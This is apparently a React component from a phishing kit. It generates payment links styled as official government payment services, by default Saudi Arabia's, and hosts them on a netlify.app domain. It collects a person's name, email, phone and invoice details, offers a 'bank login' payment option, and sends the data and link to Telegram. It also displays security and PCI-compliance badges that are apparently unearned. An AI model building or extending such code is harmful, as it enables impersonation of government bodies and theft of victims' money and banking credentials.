import React, { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getGovernmentServiceByKey, getAllGovernmentServices } from "@/lib/governmentPaymentServices";
import { getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { 
  Landmark, 
  FileText, 
  DollarSign, 
  User, 
  Phone, 
  Mail,
  Copy,
  ExternalLink,
  CheckCircle,
  Shield,
  Lock,
  CreditCard,
  Building2
} from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";

const GovernmentPaymentLinkCreator = () => {
  const { country, serviceKey } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  // Get service info
  const govService = useMemo(() => getGovernmentServiceByKey(serviceKey || ''), [serviceKey]);
  const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
  
  // State for form fields
  const [fullName, setFullName] = useState("");
  const [email, setEmail] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [reference, setReference] = useState("");
  const [selectedService, setSelectedService] = useState("");
  const [amount, setAmount] = useState("500");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [linkId, setLinkId] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState<"card" | "bank_login">("card");
  
  const allGovServices = useMemo(() => getAllGovernmentServices(), []);

  const primaryColor = govSystem.colors.primary;
  const secondaryColor = govSystem.colors.secondary;

  if (!govService) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="p-8 text-center max-w-md">
          <h2 className="text-2xl font-bold mb-4">الخدمة غير موجودة</h2>
          <p className="text-gray-600 mb-6">لم نتمكن من العثور على الخدمة المطلوبة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </Card>
      </div>
    );
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!fullName || !email || !phoneNumber || !reference || !selectedService || !amount) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country || govService.country,
        payload: {
          service_key: serviceKey,
          service_name: govService.nameAr,
          customerInfo: {
            fullName,
            phoneNumber,
            email,
          },
          payment_amount: parseFloat(amount),
          currency_code: getCurrencyCode(country || govService.country),
          reference,
          selectedServiceKey: selectedService,
          provider: govService.key.toUpperCase(),
          selectedCountry: country || govService.country,
          payment_method: paymentMethod,
        },
      });

      // For government payment services, generate direct link to /pay/:id (PaymentRecipient)
      const baseUrl = typeof window !== 'undefined'
        ? window.location.origin
        : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://glittering-eclair-9e77e0.netlify.app');
      
      // إضافة parameters للرابط: service, country, amount, currency, method
      const currencyCode = getCurrencyCode(country || govService.country);
      const queryParams = new URLSearchParams({
        service: serviceKey || govService.key,
        country: country || govService.country,
        amount: amount,
        currency: currencyCode,
        method: paymentMethod,
        provider: govService.key.toUpperCase()
      }).toString();
      
      const paymentUrl = `${baseUrl}/pay/${link.id}?${queryParams}`;

      setCreatedLink(paymentUrl);
      setLinkId(link.id);
      setShowSuccess(true);

      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          service: govService.nameAr,
          customer_name: fullName,
          phone: phoneNumber,
          email: email,
          amount: parseFloat(amount),
          currency: getCurrencySymbol(country || govService.country),
          reference: reference,
          selected_service: selectedService,
          payment_url: paymentUrl,
        },
        timestamp: new Date().toISOString(),
      });

      toast({
        title: "✅ تم إنشاء رابط الدفع بنجاح",
        description: "يمكنك الآن نسخ الرابط أو معاينته",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إنشاء رابط الدفع",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdLink);
    toast({
      title: "✅ تم النسخ",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreview = () => {
    window.open(createdLink, '_blank');
  };

  const handleNavigateToPayment = () => {
    const currencyCode = getCurrencyCode(country || govService!.country);
    const queryParams = new URLSearchParams({
      service: serviceKey || govService!.key,
      country: country || govService!.country,
      amount: amount,
      currency: currencyCode,
      method: paymentMethod,
      provider: govService!.key.toUpperCase()
    }).toString();
    navigate(`/pay/${linkId}?${queryParams}`);
  };

  if (showSuccess) {
    return (
      <div 
        className="min-h-screen flex items-center justify-center py-8 px-4"
        style={{
          background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
          fontFamily: govSystem.fonts.primaryAr
        }}
        dir="rtl"
      >
        <Card 
          className="max-w-2xl w-full overflow-hidden border-0 shadow-2xl"
          style={{ borderRadius: govSystem.borderRadius.lg }}
        >
          <div 
            className="p-8 text-center"
            style={{
              background: govSystem.gradients.header,
            }}
          >
            <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center">
              <CheckCircle className="w-12 h-12 text-white" />
            </div>
            <h2 className="text-3xl font-bold text-white mb-2">
              تم إنشاء رابط الدفع بنجاح
            </h2>
            <p className="text-white/90">
              يمكنك الآن مشاركة الرابط مع العميل
            </p>
          </div>

          <div className="p-8 space-y-6">
            <div 
              className="p-6 rounded-xl border-2"
              style={{
                borderColor: primaryColor,
                background: `${primaryColor}08`
              }}
            >
              <Label className="text-sm font-semibold mb-2 block">
                رابط الدفع
              </Label>
              <div className="bg-white p-4 rounded-lg break-all text-sm font-mono border">
                {createdLink}
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <Button
                onClick={handleCopyLink}
                size="lg"
                className="w-full"
                style={{
                  background: govSystem.gradients.primary,
                  color: govSystem.colors.textOnPrimary
                }}
              >
                <Copy className="w-5 h-5 ml-2" />
                نسخ الرابط
              </Button>
              <Button
                onClick={handlePreview}
                size="lg"
                variant="outline"
                className="w-full"
                style={{
                  borderColor: primaryColor,
                  color: primaryColor
                }}
              >
                <ExternalLink className="w-5 h-5 ml-2" />
                معاينة الرابط
              </Button>
            </div>

            <Button
              onClick={handleNavigateToPayment}
              size="lg"
              variant="secondary"
              className="w-full"
            >
              متابعة إدخال بيانات الدفع
            </Button>

            <Button
              onClick={() => window.location.href = '/services'}
              size="lg"
              variant="ghost"
              className="w-full"
            >
              العودة للخدمات
            </Button>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen py-8 px-4"
      style={{
        background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
        fontFamily: govSystem.fonts.primaryAr
      }}
      dir="rtl"
    >
      <div className="container mx-auto max-w-3xl">
        <div className="mb-6">
          <BackButton />
        </div>

        <Card 
          className="overflow-hidden border-0 shadow-2xl"
          style={{ borderRadius: govSystem.borderRadius.lg }}
        >
          <div 
            className="p-8 relative"
            style={{
              background: govSystem.gradients.header,
            }}
          >
            <div className="flex items-center gap-4">
              <div className="w-16 h-16 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center">
                <Landmark className="w-8 h-8 text-white" />
              </div>
              <div>
                <h1 className="text-3xl font-bold text-white">
                  {govService.nameAr}
                </h1>
                <p className="text-white/90 mt-1">
                  {govService.description}
                </p>
              </div>
            </div>
            
            {govService.logo && (
              <div className="absolute top-4 left-4">
                <img 
                  src={govService.logo} 
                  alt={govService.nameAr}
                  className="h-12 w-auto object-contain brightness-0 invert opacity-80"
                />
              </div>
            )}
          </div>

          <form onSubmit={handleSubmit} className="p-6 sm:p-8 space-y-5">
            <div className="text-center mb-5">
              <h2 className="text-xl sm:text-2xl font-bold mb-2" style={{ color: primaryColor }}>
                إكمال بيانات السداد
              </h2>
              <p className="text-sm text-gray-600">
                أدخل بيانات السداد لإنشاء رابط مخصص
              </p>
            </div>

            <div className="space-y-4">
              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <User className="w-4 h-4" />
                  الاسم الكامل *
                </Label>
                <Input
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  placeholder="أدخل اسمك الكامل"
                  required
                  className="h-12"
                />
              </div>

              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <Mail className="w-4 h-4" />
                  البريد الإلكتروني *
                </Label>
                <Input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="example@email.com"
                  required
                  className="h-12"
                  dir="ltr"
                />
              </div>

              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <Phone className="w-4 h-4" />
                  رقم الهاتف *
                </Label>
                <Input
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  placeholder="+966 5X XXX XXXX"
                  required
                  className="h-12"
                  dir="ltr"
                />
              </div>

              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <FileText className="w-4 h-4" />
                  الرقم المفوتر *
                </Label>
                <Input
                  value={reference}
                  onChange={(e) => setReference(e.target.value)}
                  placeholder="مثال: INV-12345"
                  required
                  className="h-12"
                />
              </div>

              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <Landmark className="w-4 h-4" />
                  الخدمة الحكومية/العامة *
                </Label>
                <Select value={selectedService} onValueChange={setSelectedService} required>
                  <SelectTrigger className="h-12">
                    <SelectValue placeholder="اختر الخدمة" />
                  </SelectTrigger>
                  <SelectContent>
                    {allGovServices.map((service) => (
                      <SelectItem key={service.key} value={service.key}>
                        {service.nameAr} - {service.country}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>

            <div className="space-y-4 pt-4 border-t mt-4">
              <div>
                <Label className="flex items-center gap-2 mb-2">
                  <DollarSign className="w-4 h-4" />
                  مبلغ السداد *
                </Label>
                <Input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="500"
                  required
                  className="h-12"
                  step="0.01"
                  min="0"
                />
                <p className="text-xs text-gray-500 mt-1.5">المبلغ الافتراضي: 500</p>
              </div>
            </div>

            <div 
              className="p-4 rounded-lg"
              style={{
                background: `${primaryColor}08`,
                borderRight: `4px solid ${primaryColor}`
              }}
            >
              <div className="flex items-start gap-3">
                <Shield className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
                <div className="flex-1">
                  <p className="text-sm font-semibold mb-1" style={{ color: primaryColor }}>
                    معاملة آمنة ومشفرة
                  </p>
                  <p className="text-xs text-gray-600">
                    جميع البيانات محمية بتقنية التشفير SSL وتتوافق مع معايير الأمان العالمية
                  </p>
                </div>
              </div>
            </div>

            <Button
              type="submit"
              size="lg"
              disabled={isSubmitting}
              className="w-full h-14 text-lg font-bold"
              style={{
                background: govSystem.gradients.primary,
                color: govSystem.colors.textOnPrimary,
                boxShadow: govSystem.shadows.lg
              }}
            >
              {isSubmitting ? (
                "جاري إنشاء الرابط..."
              ) : (
                <>
                  <Lock className="w-5 h-5 ml-2" />
                  إنشاء رابط الدفع الآمن
                </>
              )}
            </Button>
          </form>

          <div 
            className="px-8 py-4 text-center text-xs"
            style={{
              background: govSystem.colors.surface,
              borderTop: `1px solid ${govSystem.colors.border}`
            }}
          >
            <div className="flex items-center justify-center gap-4 text-gray-500">
              <div className="flex items-center gap-1">
                <Lock className="w-3 h-3" />
                <span>SSL Encrypted</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1">
                <Shield className="w-3 h-3" />
                <span>PCI Compliant</span>
              </div>
            </div>
          </div>
        </Card>
      </div>
    </div>
  );
};

export default GovernmentPaymentLinkCreator;
